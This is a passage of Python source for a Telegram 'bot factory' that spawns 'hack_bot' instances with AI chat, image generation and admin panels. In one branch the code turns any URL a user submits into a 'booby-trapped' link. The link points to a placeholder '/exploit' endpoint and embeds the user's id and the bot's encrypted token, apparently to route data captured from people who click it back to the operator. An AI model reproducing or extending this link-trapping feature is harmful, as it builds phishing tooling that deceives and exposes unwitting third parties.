                        send_message(context.bot, MAIN_ADMIN_ID,
                                    f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتعيين عدد نقاط البايلود في البوت @{current_bot_username} إلى {points}.",
                                    parse_mode=ParseMode.MARKDOWN)
                else:
                    send_message(context.bot, chat_id, "❌ الرجاء إرسال عدد صحيح موجب أو صفر للنقاط.")
            except ValueError:
                send_message(context.bot, chat_id, "❌ الرجاء إرسال عدد صحيح للنقاط.")
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
        return

    elif isinstance(current_state, dict) and current_state.get("action") == "await_button_name": # Only for hack_bot
        if bot_type == "hack_bot":
            button_name = text
            button_type = current_state["type"]
            bot_user_states[current_bot_username][user_id]["button_name"] = button_name
            
            if button_type == "external_link":
                send_message(context.bot, chat_id, f"الرجاء إرسال الرابط الخارجي لزر '{button_name}': 🌐")
                bot_user_states[current_bot_username][user_id]["action"] = "await_external_link"
            elif button_type == "internal_link":
                send_message(context.bot, chat_id, f"الرجاء إرسال الرابط الداخلي لزر '{button_name}': 🔗")
                bot_user_states[current_bot_username][user_id]["action"] = "await_internal_link"
            elif button_type == "send_message":
                send_message(context.bot, chat_id, f"الرجاء إرسال الرسالة لزر '{button_name}'. ✉️\nيمكنك استخدام المتغيرات التالية:\n`#id` لعرض معرف المستخدم\n`#username` لعرض اسم المستخدم\n`#name` لعرض الاسم الأول للمستخدم")
                bot_user_states[current_bot_username][user_id]["action"] = "await_message_value"
        return

    elif isinstance(current_state, dict) and current_state.get("action") == "await_external_link": # Only for hack_bot
        if bot_type == "hack_bot":
            button_name = current_state["button_name"]
            link = text
            if link and (link.startswith("http://") or link.startswith("https://")):
                bot_settings["custom_buttons"].append({"name": button_name, "type": "external_link", "value": link})
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إضافة الزر '{button_name}' بنجاح. 🚀",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة إلى قسم الأزرار 🔙", callback_data="buttons_panel")]]))
            else:
                send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ \"https\" أو \"http\". ❌")
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
        return

    elif isinstance(current_state, dict) and current_state.get("action") == "await_internal_link": # Only for hack_bot
        if bot_type == "hack_bot":
            button_name = current_state["button_name"]
            link = text
            if link and (link.startswith("http://") or link.startswith("https://")): # Internal links can also be URLs
                bot_settings["custom_buttons"].append({"name": button_name, "type": "internal_link", "value": link})
                save_made_bot_settings(current_bot_username)
                send_message(context.bot, chat_id, f"✅ تم إضافة الزر '{button_name}' بنجاح. 🚀",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة إلى قسم الأزرار 🔙", callback_data="buttons_panel")]]))
            else:
                send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ \"https\" أو \"http\". ❌")
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
        return

    elif isinstance(current_state, dict) and current_state.get("action") == "await_message_value": # Only for hack_bot
        if bot_type == "hack_bot":
            button_name = current_state["button_name"]
            message_value = text
            bot_settings["custom_buttons"].append({"name": button_name, "type": "send_message", "value": message_value})
            save_made_bot_settings(current_bot_username)
            send_message(context.bot, chat_id, f"✅ تم إضافة الزر '{button_name}' بنجاح. 🚀",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة إلى قسم الأزرار 🔙", callback_data="buttons_panel")]]))
            bot_user_states[current_bot_username][user_id] = None
            bot_settings["rembo_state"] = None
            save_made_bot_settings(current_bot_username)
        return

    # Handle user input for AI, Dream Interpret, Blue Genie, Image Generation, Text-to-Speech (only for hack_bot)
    elif bot_type == "hack_bot":
        if current_state == "await_ai_question":
            send_message(context.bot, chat_id, "⏳ جاري معالجة سؤالك بواسطة الذكاء الاصطناعي... 🤖")
            response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_dream_description":
            send_message(context.bot, chat_id, "⏳ جاري تفسير حلمك... 🧙‍♂️")
            response = interact_with_ai_api(text, "dream_interpret", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_genie_game_start":
            send_message(context.bot, chat_id, "🧞‍♂️ المارد الأزرق يفكر... 🤔")
            response = interact_with_ai_api(text, "blue_genie_game", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_image_description":
            send_message(context.bot, chat_id, "⏳ جاري إنشاء الصورة... 🎨")
            image_url = generate_image_via_api(text, current_bot_username, user_id)
            if image_url:
                try:
                    context.bot.send_photo(chat_id=chat_id, photo=image_url, caption="✅ تم إنشاء الصورة بنجاح! 🖼️")
                except Exception as e:
                    send_message(context.bot, chat_id, f"تم إنشاء الصورة، ولكن حدث خطأ أثناء إرسالها: {e} ❌")
            else:
                send_message(context.bot, chat_id, "❌ حدث خطأ أثناء إنشاء الصورة. يرجى المحاولة مرة أخرى. 😔")
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_text_to_speech_input":
            send_message(context.bot, chat_id, "⏳ جاري تحويل النص إلى صوت... 🔊")
            audio_url = convert_text_to_speech_via_api(text, current_bot_username, user_id)
            if audio_url:
                try:
                    context.bot.send_audio(chat_id=chat_id, audio=audio_url, caption="✅ تم تحويل النص إلى صوت بنجاح! 🎶")
                except Exception as e:
                    send_message(context.bot, chat_id, f"تم تحويل النص إلى صوت، ولكن حدث خطأ أثناء إرساله: {e} ❌")
            else:
                send_message(context.bot, chat_id, "❌ حدث خطأ أثناء تحويل النص إلى صوت. يرجى المحاولة مرة أخرى. 😔")
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_shereen_ai_question":
            send_message(context.bot, chat_id, "⏳ جاري معالجة سؤالك بواسطة ذكاء شيرين الاصطناعي... 🎤")
            response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_deepseek_ai_question":
            send_message(context.bot, chat_id, "⏳ جاري معالجة سؤالك بواسطة ذكاء ديب سيك الاصطناعي... 🧠")
            response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_chatgpt_3_5_question":
            send_message(context.bot, chat_id, "⏳ جاري معالجة سؤالك بواسطة ذكاء ChatGPT-3.5 الاصطناعي... 💬")
            response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
            send_message(context.bot, chat_id, response)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_name_decorate_input_en":
            decorated_text = decorate_english_name(text)
            send_message(context.bot, chat_id, decorated_text)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_name_decorate_input_ar":
            decorated_text = decorate_arabic_name(text)
            send_message(context.bot, chat_id, decorated_text)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_link_check_input":
            send_message(context.bot, chat_id, "⏳ جاري فحص الرابط... 🔍")
            check_url_virustotal(update, context, text, current_bot_username, user_id)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        elif current_state == "await_link_exploit_input":
            original_link = text
            if original_link and (original_link.startswith("http://") or original_link.startswith("https://")):
                bot_token_for_link = get_bot_token_from_username(current_bot_username)
                if bot_token_for_link:
                    encrypted_data = encrypt_token(bot_token_for_link)
                    brokweb = "https://your-main-website.com" # Placeholder, replace with actual base URL if needed
                    exploited_link = f"{brokweb}/exploit?id={user_id}&token={encrypted_data}&url={urllib.parse.quote(original_link)}"
                    
                    send_message(context.bot, chat_id, f"تم تلغيم هذا الرابط ⚠️:\nالرابط الأصلي: `{original_link}`\nالرابط الملغم: `{exploited_link}`", parse_mode=ParseMode.MARKDOWN)
                else:
                    send_message(context.bot, chat_id, "حدث خطأ: لم يتم العثور على توكن البوت لإنشاء الرابط. ❌")
            else:
                send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ \"https\" أو \"http\". ❌")
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

    # If no specific state, send main keyboard
    if user_id == admin_id:
        send_message(context.bot, chat_id,
                     "مرحبًا! إليك أوامرك: ⚡📮\n\n1. إدارة المشترڪين والتحكم بهم. 👥\n2. إرسال إذاعات ورسائل موجهة. 📢\n3. ضبط إعدادات الاشتراك الإجباري. 💢\n4. تفعيل أو تعطيل التنبيهات. ✔️❎\n5. إدارة حالة البوت ووضع الاشتراك. 💰🆓",
                     reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
        if bot_type == "encryption_bot":
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username if update.effective_user.username else "غير متاح"
            welcome_message = (
                f"مرحباً {user_name}! 👋\n"
                f"يوزر: @{user_username}\n"
                f"ايدي: {user_id}\n\n"
                f"تم مرحبا بك في عالم فك/التشفير 🔐 ✅"
            )
            send_message(context.bot, chat_id, welcome_message, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "factory_bot":
            send_message(context.bot, chat_id,
                         "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريد انشاءه 🎩",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else: # hack_bot
            send_message(context.bot, chat_id,
                         bot_settings["start_message"],
                         parse_mode=ParseMode.MARKDOWN,
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    else:
        if bot_type == "encryption_bot":
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username if update.effective_user.username else "غير متاح"
            welcome_message = (
                f"مرحباً {user_name}! 👋\n"
                f"يوزر: @{user_username}\n"
                f"ايدي: {user_id}\n\n"
                f"تم مرحبا بك في عالم فك/التشفير 🔐 ✅"
            )
            send_message(context.bot, chat_id, welcome_message, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "factory_bot":
            send_message(context.bot, chat_id,
                         "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريد انشاءه 🎩",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else: # hack_bot
            send_message(context.bot, chat_id,
                         bot_settings["start_message"],
                         parse_mode=ParseMode.MARKDOWN,
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))

def run_made_bot(bot_token, admin_id, bot_username, bot_type):
    """يشغل بوتًا مصنوعًا."""
    try:
        updater = Updater(bot_token, use_context=True)
        dispatcher = updater.dispatcher

        # Load bot settings or create default ones
        load_made_bot_settings(bot_username)
        # Ensure bot_type is correctly set in settings
        made_bot_data[bot_username]["bot_type"] = bot_type
        # تطبيق حالة الاشتراك الإجباري للمصنع الأساسي على البوت
        # هذا يضمن أن القناة الأساسية للمصنع تضاف إلى قنوات الاشتراك الإجباري للبوت المصنوع
        if FACTORY_MAIN_SUBSCRIPTION_ENABLED and FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
        elif not FACTORY_MAIN_SUBSCRIPTION_ENABLED and FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
        save_made_bot_settings(bot_username)

        # Add handlers for the made bot
        dispatcher.add_handler(CommandHandler("start", start_made_bot))
        dispatcher.add_handler(CallbackQueryHandler(handle_callback_query_made_bot))
        dispatcher.add_handler(MessageHandler(Filters.all & ~Filters.command, handle_message_made_bot)) # Filters.all to catch documents too
        
        # Specific handlers for hack_bot
        if bot_type == "hack_bot":
            dispatcher.add_handler(CommandHandler("vip", handle_message_made_bot))
            dispatcher.add_handler(CommandHandler("free", handle_message_made_bot))

        updater.start_polling()
        logging.info(f"Made bot @{bot_username} (type: {bot_type}) started polling. ✅")
        return updater
    except Exception as e:
        logging.error(f"خطأ في تشغيل البوت المصنوع {bot_username} (نوع: {bot_type}): {e} ❌")
        return None

def load_all_made_bots():
    """تحميل وتشغيل جميع البوتات المصنوعة من ملفات JSON."""
    for filename in os.listdir(DATABASE_DIR):
        if filename.endswith(".json") and not filename.endswith("_settings.json"):
            bot_username = filename.replace(".json", "")
            bot_data_file = os.path.join(DATABASE_DIR, filename)
            try:
                with open(bot_data_file, 'r') as f:
                    data = json.load(f)
                    bot_token = data.get("token")
                    admin_id = data.get("admin_id")
                    bot_type = data.get("bot_type", "hack_bot") # Default to hack_bot for old entries
                    if bot_token and admin_id:
                        # Add to created_bots for main bot management
                        if admin_id not in created_bots:
                            created_bots[admin_id] = []
                        # Check if bot already exists to avoid duplicates on restart
                        if not any(b['username'] == bot_username for b in created_bots[admin_id]):
                            created_bots[admin_id].append({"token": bot_token, "admin_id": admin_id, "username": bot_username, "bot_type": bot_type})

                        # Run the bot
                        updater = run_made_bot(bot_token, admin_id, bot_username, bot_type)
                        if updater:
                            running_made_bot_updaters[bot_username] = updater
            except Exception as e:
                logging.error(f"خطأ في تحميل أو تشغيل البوت من {filename}: {e} ❌")

def periodic_bot_restart():
    """
    وظيفة لإعادة تشغيل البوتات المصنوعة بشكل دوري.
    هذا يساعد في تحديث الإعدادات أو حل المشاكل العالقة.
    """
    logging.info("بدء إعادة التشغيل الدورية للبوتات المصنوعة... 🔄")
    while True:
        time.sleep(3600) # إعادة التشغيل كل ساعة
        logging.info("تنفيذ إعادة التشغيل الدورية للبوتات المصنوعة... ⏳")
        bots_to_restart = list(running_made_bot_updaters.keys())
        for bot_username in bots_to_restart:
            logging.info(f"إيقاف البوت @{bot_username} لإعادة التشغيل... 🛑")
            try:
                if bot_username in running_made_bot_updaters:
                    running_made_bot_updaters[bot_username].stop()
                    del running_made_bot_updaters[bot_username]
                    logging.info(f"تم إيقاف البوت المصنوع @{bot_username}. ❌")
            except Exception as e:
                logging.error(f"خطأ في إيقاف البوت @{bot_username} أثناء إعادة التشغيل الدورية: {e} ❌")
                continue

            # Find bot_token, admin_id, and bot_type from created_bots
            bot_token = None
            admin_id = None
            bot_type = None
            for user_id, bots_list in created_bots.items():
                for bot_info in bots_list:
                    if bot_info["username"] == bot_username:
                        bot_token = bot_info["token"]
                        admin_id = bot_info["admin_id"]
                        bot_type = bot_info["bot_type"]
                        break
                if bot_token:
                    break
            
            if bot_token and admin_id and bot_type:
                logging.info(f"إعادة تشغيل البوت @{bot_username} (نوع: {bot_type})... 🟢")
                try:
                    updater = run_made_bot(bot_token, admin_id, bot_username, bot_type)
                    if updater:
                        running_made_bot_updaters[bot_username] = updater
                        logging.info(f"تمت إعادة تشغيل البوت @{bot_username} بنجاح. ✅")
                    else:
                        logging.error(f"فشل في إعادة تشغيل البوت @{bot_username}. ❌")
                except Exception as e:
                    logging.error(f"خطأ أثناء إعادة تشغيل البوت @{bot_username}: {e} ❌")
            else:
                logging.warning(f"لم يتم العثور على بيانات للبوت @{bot_username} لإعادة التشغيل. ℹ️")

def main():
    """الدالة الرئيسية لتشغيل البوت."""
    updater = Updater(MAIN_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # Load all previously created bots
    load_all_made_bots()

    # Start periodic bot restart thread
    restart_thread = threading.Thread(target=periodic_bot_restart)
    restart_thread.daemon = True # Allow the main program to exit even if this thread is running
    restart_thread.start()
    logging.info("تم بدء مؤشر ترابط إعادة تشغيل البوت الدوري. 🔄")

    # Handlers for the main bot
    dispatcher.add_handler(CommandHandler("start", start_main_bot))
    dispatcher.add_handler(CallbackQueryHandler(create_bot_main_bot, pattern='^create_bot$'))
    dispatcher.add_handler(CallbackQueryHandler(create_hack_bot_main_bot, pattern='^create_hack_bot$')) # New handler
    dispatcher.add_handler(CallbackQueryHandler(create_encryption_bot_main_bot, pattern='^create_encryption_bot$')) # New handler
    dispatcher.add_handler(CallbackQueryHandler(create_factory_bot_main_bot, pattern='^create_factory_bot$')) # NEW: Factory Bot creation handler
    dispatcher.add_handler(CallbackQueryHandler(manage_bots_main_bot, pattern='^manage_bots$'))
    dispatcher.add_handler(CallbackQueryHandler(bot_info_main_bot, pattern='^info_'))
    dispatcher.add_handler(CallbackQueryHandler(delete_bot_main_bot, pattern='^delete_'))
    dispatcher.add_handler(CallbackQueryHandler(add_factory_admin_main_bot, pattern='^add_factory_admin$'))
    dispatcher.add_handler(CallbackQueryHandler(remove_factory_admin_main_bot, pattern='^remove_factory_admin$'))
    dispatcher.add_handler(CallbackQueryHandler(factory_stats_main_bot, pattern='^factory_stats$'))
    dispatcher.add_handler(CallbackQueryHandler(stop_all_bots_main_bot, pattern='^stop_all_bots$'))
    dispatcher.add_handler(CallbackQueryHandler(start_all_bots_main_bot, pattern='^start_all_bots$'))
    dispatcher.add_handler(CallbackQueryHandler(broadcast_free_bots_main_bot, pattern='^broadcast_free_bots$'))
    dispatcher.add_handler(CallbackQueryHandler(add_factory_main_subscription, pattern='^add_factory_main_subscription$')) # NEW
    dispatcher.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern='^remove_factory_main_subscription$')) # NEW
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message_main_bot))

    # Start the Bot
    updater.start_polling()
    logging.info("تم بدء استطلاع البوت الرئيسي. 🚀")
    updater.idle()

if __name__ == "__main__":
    main()